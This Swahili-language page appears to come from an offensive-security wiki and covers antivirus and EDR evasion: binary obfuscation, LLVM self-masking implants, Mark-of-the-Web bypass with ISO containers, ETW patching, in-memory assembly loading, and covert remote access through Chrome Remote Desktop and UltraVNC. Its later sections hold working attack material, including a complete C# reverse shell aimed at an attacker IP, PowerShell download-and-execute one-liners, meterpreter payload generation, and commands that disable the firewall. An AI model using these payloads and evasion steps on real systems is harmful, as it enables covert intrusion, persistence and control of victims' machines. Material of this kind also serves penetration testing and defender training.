## Obfuscation

> [!TIP]
> Mbinu kadhaa za obfuscation hutegemea kusimba data kwa njia fiche, jambo linaloongeza entropy ya binary na kurahisisha AVs na EDRs kuitambua. Kuwa mwangalifu na hili, na ikiwezekana tumia usimbaji fiche kwenye sehemu mahususi tu za code yako zilizo nyeti au zinazohitaji kufichwa.

### Kuondoa Obfuscation kwenye .NET Binaries Zilizolindwa kwa ConfuserEx

Unapochanganua malware inayotumia ConfuserEx 2 (au forks za kibiashara), ni kawaida kukutana na tabaka kadhaa za ulinzi zinazozuia decompilers na sandboxes. Mchakato ulio hapa chini hurejesha kwa uhakika **IL iliyo karibu na ya awali**, ambayo baadaye inaweza kugeuzwa kuwa C# kwa kutumia zana kama dnSpy au ILSpy.<sup>[[10]](#references)</sup>

1.  Kuondoa ulinzi dhidi ya uchezewaji – ConfuserEx husimba kila *method body* na kuifungua ndani ya *module* static constructor (`<Module>.cctor`). Pia hubadilisha PE checksum, hivyo marekebisho yoyote yatafanya binary kuharibika. Tumia **AntiTamperKiller** kutafuta jedwali za metadata zilizosimbwa, kurejesha funguo za XOR na kuandika upya assembly safi:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output ina vigezo 6 vya anti-tamper (`key0-key3`, `nameHash`, `internKey`) vinavyoweza kusaidia unapotengeneza unpacker yako mwenyewe.

2.  Urejeshaji wa symbol / control-flow – pitisha faili *safi* kwenye **de4dot-cex** (fork ya de4dot inayotambua ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – chagua profile ya ConfuserEx 2
     • de4dot itatengua control-flow flattening, kurejesha namespaces, classes na majina ya variables ya awali, na kusimbua strings za constants.

3.  Proxy-call stripping – ConfuserEx hubadilisha method calls za moja kwa moja kwa wrappers nyepesi (zinazojulikana pia kama *proxy calls*) ili kufanya decompilation iwe ngumu zaidi. Ziondoe kwa **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Baada ya hatua hii unapaswa kuona .NET API za kawaida kama `Convert.FromBase64String` au `AES.Create()` badala ya wrapper functions zisizoeleweka (`Class8.smethod_10`, …).

4.  Usafishaji wa mikono – endesha binary iliyotokana na hatua hii chini ya dnSpy, tafuta blob kubwa za Base64 au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata payload *halisi*. Mara nyingi malware huihifadhi kama byte array iliyosimbwa kwa TLV na kuanzishwa ndani ya `<Module>.byte_0`.

Msururu huu hurejesha mtiririko wa utekelezaji **bila** kuhitaji kuendesha sample hasidi – jambo linalofaa unapofanya kazi kwenye workstation isiyo na muunganisho wa mtandao.

> 🛈  ConfuserEx hutengeneza custom attribute inayoitwa `ConfusedByAttribute`, ambayo inaweza kutumika kama IOC kuchuja samples kiotomatiki.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya chanzo wazi ya LLVM compilation suite inayoweza kuongeza usalama wa software kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na kuzuia uchezewaji.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator huonyesha jinsi ya kutumia lugha ya `C++11/14` kutengeneza code iliyofichwa wakati wa compilation, bila kutumia tool yoyote ya nje na bila kurekebisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Huongeza safu ya operations zilizofichwa zinazotengenezwa na C++ template metaprogramming framework, jambo linalofanya maisha ya mtu anayetaka kuvunja application kuwa magumu kidogo.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza kuficha aina mbalimbali za pe files, zikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni engine rahisi ya metamorphic code kwa executables za aina yoyote.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni framework ya code obfuscation yenye udhibiti wa kina kwa lugha zinazotumika na LLVM, inayotumia ROP (return-oriented programming). ROPfuscator huficha program katika kiwango cha assembly code kwa kubadilisha instructions za kawaida kuwa ROP chains, na hivyo kuvuruga dhana yetu ya kawaida kuhusu control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzipakia

### LLVM compiler-assisted per-function self-masking

Badala ya kuficha implant nzima wakati tu imelala, LLVM X86 backend iliyorekebishwa inaweza kuweka functions zilizochaguliwa katika hali ya XOR-masked kila zinapokuwa hazitumiki. Function Peekaboo PoC huchagua majina yaliyofanyiwa demangle yenye `REG_`, huingiza entry/exit stubs zisizotegemea mahali karibu na machine code ya mwisho, na kutoa handler moja ya masking inayoshirikiwa ndani ya `.text`; signatures za kiwango cha source na Windows x64 calling convention hubaki bila kubadilika.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Mabadiliko haya yanapaswa kufanyika baada ya instruction selection na optimization kwa sababu yanahitaji kushughulikia **kila return inayotolewa** na kujua mpangilio halisi wa x86. `MachineFunctionPass` inayotekelezwa kabla ya utoaji hutafuta `MachineInstr::isReturn()` ya mwisho, huifuta ili njia ya mwisho iendelee hadi kwenye epilogue iliyoongezwa, na kubadilisha returns za awali kuwa `JMP_1 handler`. Hifadhi uondoaji wowote wa stack/frame uliotengenezwa na compiler unaotangulia kila return; elekeza upya instruction ya return pekee.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` na `X86AsmPrinter::emitFunctionBodyEnd()` hutoa stubs za kila function, huku `emitEndOfAsmFile()` ikitoa handler. Symbols zinazoshirikiwa kati ya hatua za utoaji huruhusu tawi la prologue kulenga epilogue yake itakayotolewa baadaye; kwa `je` ya karibu inayotolewa kwa mkono, andika `0F 84` ikifuatiwa na MC expression ya baiti nne `target - address_after_je`. Badala yake, calls na jumps kwenda kwa handler zinaweza kutolewa kama objects za `MCInst` (`CALL64pcrel32` na `JMP_1`). Pass inapaswa kurudisha `false` kwa function ambayo haikuchaguliwa ikiwa haikubadilisha chochote; PoC hurudisha `true` kimakosa katika hali hiyo.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata na pre-CRT initialization

PoC huweka XOR key na rekodi za baiti 16 zenye function pointer iliyorekebishwa na loader pamoja na urefu wa runtime ndani ya `.funcmeta`. Ingawa sehemu ya C ni `uint32_t`, handler hufikia QWORD kwenye offset ya rekodi `+8`, na hivyo kutumia urefu pamoja na padding yake, kisha husogeza rekodi kwa `0x10`. Majina ya PE section yana kikomo cha baiti nane tu, kwa hivyo utafutaji wa runtime huona `.funcmet`. Patcher ya nje huongeza `.stub` inayoweza kutekelezwa, huhifadhi RVA ya entry point ya awali ndani ya stub, na kuelekeza upya `AddressOfEntryPoint`; PIC stub hupata image base kutoka `gs:[0x60]` → `[PEB+0x10]`, hupitia imports za PE32+ ili kutatua `VirtualProtect` ambayo tayari imeingizwa, na huendeshwa kabla ya CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Initialization huweka sentinel katika `gs:[0xE8]` na kuita kila function ya metadata. Prologue yake inayosomeka daima huweka mwanzo wa function katika `gs:[0xF0]`, hutambua sentinel, na kuruka body ambayo bado haijafichwa. Kisha epilogue hutumia `call handler`; baada ya handler kuhifadhi registers 13 (`0x68` bytes), anwani ya kurudi katika `[rsp+0x68]` huwa mwisho wa function iliyobadilishwa, kwa hiyo `end - start` inaweza kuandikwa kwenye rekodi yake ya metadata. Stub huondoa sentinel na kuruka hadi `ImageBase + original_entry_point_RVA` baada ya bodies zote kufichwa.<sup>[[38]](#references)[[39]](#references)</sup>

Wakati wa call ya kawaida, prologue huita handler ileile yenye ulinganifu ili kufungua body. Njia ya mwisho huingia kwenye epilogue iliyoongezwa, huku kila return ya awali ikiruka moja kwa moja hadi kwa handler inayoshirikiwa. Epilogue ya kawaida pia hutumia `jmp handler` badala ya `call`, kwa hiyo baada ya kuficha tena, `ret` ya handler hutumia anwani ya kurudi ya caller wa awali na huhifadhi matokeo ya function katika `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive na viashiria vya uchanganuzi

Handler hupata rekodi ya sasa, huruka prologue isiyofichwa yenye urefu usiobadilika (`0x46` bytes katika build hii), hubadilisha sehemu iliyobaki kuwa `PAGE_EXECUTE_READWRITE`, huifanya XOR byte kwa byte kwa kutumia byte ya chini ya key, kisha huibadilisha kuwa `PAGE_EXECUTE_READ`. Hivyo loop hiyohiyo hufungua body wakati wa kuingia na kuificha wakati wa kila kutoka kwa kawaida.<sup>[[38]](#references)[[39]](#references)</sup>

Viashiria muhimu vya muundo huu ni pamoja na:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point ndani ya `.stub` inayoweza kutekelezwa na section ya `.funcmet` iliyo na key pamoja na pointers za `.text` zilizorekebishwa;
- uchanganuzi wa PEB, import table na section table kabla ya CRT, ukifuatiwa na calls kupitia kila pointer ya metadata;
- PIC prologues zinazofanana za `call`/`pop` na return sites nyingi zinazoelekezwa upya kwa handler mmoja;
- writes kwenda `gs:[0xE8]`, `gs:[0xF0]` na `gs:[0xF8]`, zikifuatiwa na mabadiliko ya mara kwa mara ya `VirtualProtect` na writes za XOR byte kwa byte kwenye kurasa za executable zinazoungwa mkono na image.

Huu ni ukwepaji wa memory scanner, si ulinzi wa cryptographic: file iliyorekebishwa bado ina body ya awali iliyo wazi, na debugger inaweza kusimama kwenye `VirtualProtect` au XOR loop na kunakili function iliyo hai. XOR ya byte moja, metadata inayosomeka na mpaka usiobadilika wa `0x46` pia hurahisisha urejeshaji wa offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slots za PoC ni za kila thread, lakini code pages zilizorekebishwa ni za process nzima. Kwa hiyo, entry ya wakati mmoja au ya kujirudia inaweza kubadilisha tena instructions huku invocation nyingine ikiendelea kutekelezwa; exceptions na exits zisizo za kawaida zinaweza pia kuruka hatua ya kuficha tena. Utekelezaji imara lazima usawazishe mabadiliko, urejeshe protection iliyorejeshwa kupitia `lpflOldProtect`, uepuke urefu wa stub uliowekwa kwa thamani isiyobadilika, ukague njia za `call` na `jmp` kwa ajili ya x64 stack alignment, na uite `FlushInstructionCache` baada ya kuandika upya bytes zinazoweza kutekelezwa. Microsoft inaweka wazi kuwa caller anawajibika kuhakikisha instruction-cache coherency wakati code inayoweza kutekelezwa inabadilishwa.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Huenda umeona skrini hii unapopakua baadhi ya executables kutoka mtandaoni na kuziendesha.

Microsoft Defender SmartScreen ni utaratibu wa usalama unaolenga kumlinda mtumiaji wa mwisho dhidi ya kuendesha applications zinazoweza kuwa hasidi.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen hutegemea zaidi mbinu inayotumia sifa; hii inamaanisha kuwa applications zisizopakuliwa mara nyingi zitaanzisha SmartScreen, na hivyo kumtahadharisha mtumiaji wa mwisho na kumzuia kuendesha file (ingawa file bado linaweza kuendeshwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) inayoitwa Zone.Identifier, ambayo huundwa kiotomatiki wakati wa kupakua files kutoka mtandaoni, pamoja na URL ambayo yamepakuliwa kutoka humo.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kuangalia Zone.Identifier ADS ya file lililopakuliwa kutoka mtandaoni.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kuwa executables zilizosainiwa kwa cheti cha kusaini kinachoaminika **hazitaanzisha SmartScreen**.

Njia yenye ufanisi mkubwa ya kuzuia payloads zako kupata Mark of The Web ni kuzipakia ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kuwekwa kwenye volumes **zisizo za NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni tool inayopakia payloads ndani ya output containers ili kukwepa Mark-of-the-Web.

Mfano wa matumizi:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hii hapa demo ya kukwepa SmartScreen kwa kufungasha payloads ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni utaratibu wenye nguvu wa logging katika Windows unaoruhusu programu na vipengele vya mfumo **kurekodi matukio**. Hata hivyo, bidhaa za usalama pia zinaweza kuutumia kufuatilia na kugundua shughuli hasidi.

Kama vile AMSI inavyolemazwa (kukwepwa), inawezekana pia kufanya function ya **`EtwEventWrite`** ya mchakato wa user space irudi mara moja bila kurekodi matukio yoyote. Hili hufanywa kwa ku-patch function hiyo kwenye memory ili irudi mara moja, na hivyo kuzima logging ya ETW kwa mchakato huo.

Unaweza kupata maelezo zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) na [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Kupakia binaries za C# kwenye memory kumejulikana kwa muda mrefu, na bado ni njia nzuri sana ya kuendesha zana zako za post-exploitation bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutahitaji tu kuwa na wasiwasi kuhusu ku-patch AMSI kwa mchakato mzima.

Frameworks nyingi za C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, n.k.) tayari zina uwezo wa kutekeleza C# assemblies moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Hii inahusisha **kuanzisha mchakato mpya wa kafara**, kuingiza msimbo hasidi wa post-exploitation ndani ya mchakato huo mpya, kutekeleza msimbo huo hasidi, na baada ya kumaliza, kuua mchakato huo mpya. Njia hii ina faida na hasara zake. Faida ya njia ya fork and run ni kwamba utekelezaji hufanyika **nje ya** mchakato wa Beacon implant wetu. Hii inamaanisha kwamba hitilafu ikitokea katika hatua yetu ya post-exploitation au tukigunduliwa, kuna **uwezekano mkubwa zaidi** wa **implant yetu kuendelea kufanya kazi.** Hasara ni kwamba kuna **uwezekano mkubwa zaidi** wa kugunduliwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Hii inahusu kuingiza msimbo hasidi wa post-exploitation **ndani ya mchakato wake wenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kuukagua na AV, lakini hasara ni kwamba hitilafu ikitokea wakati payload yako inatekelezwa, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwa kuwa inaweza ku-crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa ungependa kusoma zaidi kuhusu kupakia C# Assembly, angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na BOF yao ya InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**; angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [video ya S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Kutumia Lugha Nyingine za Programming

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza msimbo hasidi kwa kutumia lugha nyingine kwa kuipa mashine iliyoathiriwa ufikiaji **wa mazingira ya interpreter yaliyosakinishwa kwenye SMB share inayodhibitiwa na Mshambuliaji**.

Kwa kuruhusu ufikiaji wa Interpreter Binaries na mazingira yaliyopo kwenye SMB share, unaweza **kutekeleza msimbo wowote wa lugha hizi ndani ya memory** ya mashine iliyoathiriwa.

Repo inaeleza: Defender bado hukagua scripts, lakini kwa kutumia Go, Java, PHP n.k. tunapata **uhuru zaidi wa kukwepa static signatures**. Majaribio ya scripts za reverse shell zisizofichwa, zilizochaguliwa bila mpangilio katika lugha hizi yamefaulu.

## TokenStomping

Token stomping hubadilisha access token ya bidhaa ya usalama kama vile EDR au AV. Kupunguza privileges za token kunaweza kuacha mchakato ukiendelea huku kuuzuia kufanya ukaguzi au hatua za kurekebisha zinazohitaji privileges.

Ili kuzuia hili, Windows inaweza **kuzuia michakato ya nje** kupata handles za tokens za michakato ya usalama.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Kutumia Software Inayoaminika

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**makala hii ya blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu kupeleka Chrome Remote Desktop kwenye PC ya mwathiriwa, kisha kuitumia kuidhibiti na kudumisha persistence:<sup>[[35]](#references)</sup>
1. Pakua kutoka https://remotedesktop.google.com/, bofya "Set up via SSH", kisha bofya faili ya MSI ya Windows ili kuipakua.
2. Endesha installer bila kuonyesha dirisha kwenye mashine ya mwathiriwa (admin inahitajika): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na ubofye next. Wizard itakuomba uidhinishe; bofya kitufe cha Authorize ili kuendelea.
4. Tekeleza command uliyopewa baada ya kufanya marekebisho yanayohitajika: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parameter ya `--pin` huweka PIN bila kutumia GUI).
 

## Ukwepaji wa Hali ya Juu

Ukwepaji ni mada ngumu sana; wakati mwingine unapaswa kuzingatia vyanzo vingi tofauti vya telemetry katika mfumo mmoja, hivyo kwa kiasi kikubwa haiwezekani kubaki bila kugunduliwa kabisa katika mazingira yaliyokomaa.

Kila mazingira unayokabiliana nayo yatakuwa na uwezo na udhaifu wake.

Ninakuhimiza sana uangalie mazungumzo haya kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili upate msingi wa mbinu za Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hili pia ni mazungumzo mengine mazuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Mbinu za Zamani**

### **Angalia ni sehemu zipi Defender inaziona kuwa hasidi**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), ambayo **itaondoa sehemu za binary** hadi **igundue ni sehemu ipi Defender** inaona kuwa hasidi, kisha itakuonyesha sehemu hiyo.\
Zana nyingine inayofanya **jambo hilo hilo ni** [**avred**](https://github.com/dobin/avred), ambayo hutoa huduma hiyo kwenye tovuti ya wazi katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo ungeweza kusakinisha (kama msimamizi) kwa kutekeleza:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Iifanye **ianze** mfumo unapowashwa na **uiendeshe** sasa:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Badili port ya telnet** (kwa siri) na uzime firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unahitaji vipakuliwa vya bin, si vya setup)

**KWENYE HOST**: Tekeleza _**winvnc.exe**_ na usanidi seva:

- Washa chaguo _Disable TrayIcon_
- Weka nenosiri kwenye _VNC Password_
- Weka nenosiri kwenye _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili _**UltraVNC.ini**_ lililoundwa **hivi karibuni** ndani ya **victim**

#### **Muunganisho wa reverse**

**Attacker** anapaswa **kutekeleza ndani ya** **host** yake binary `vncviewer.exe -listen 5900` ili iwe **tayari** kupokea **muunganisho wa reverse VNC**. Kisha, ndani ya **victim**: Anzisha daemon ya winvnc `winvnc.exe -run` na utekeleze `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ONYO:** Ili kudumisha usiri, hupaswi kufanya mambo machache

- Usianzishe `winvnc` ikiwa tayari inaendeshwa, la sivyo utasababisha [popup](https://i.imgur.com/1SROTTl.png). angalia ikiwa inaendeshwa kwa `tasklist | findstr winvnc`
- Usianzishe `winvnc` bila `UltraVNC.ini` kwenye saraka hiyo hiyo, la sivyo itafungua [the config window](https://i.imgur.com/rfMQWcf.png)
- Usiendeshe `winvnc -h` ili kupata msaada, la sivyo utasababisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Ndani ya GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sasa **anzisha lister** kwa `msfconsole -r file.rc` na **tekeleza** **xml payload** kwa:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Defender wa sasa atasitisha process haraka sana.**

### Kukompile reverse shell yetu wenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Reverse shell ya kwanza ya C#

Kompile kwa:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Itumie pamoja na:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# kwa kutumia compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji wa kiotomatiki:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Mfano wa kutumia python kutengeneza injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

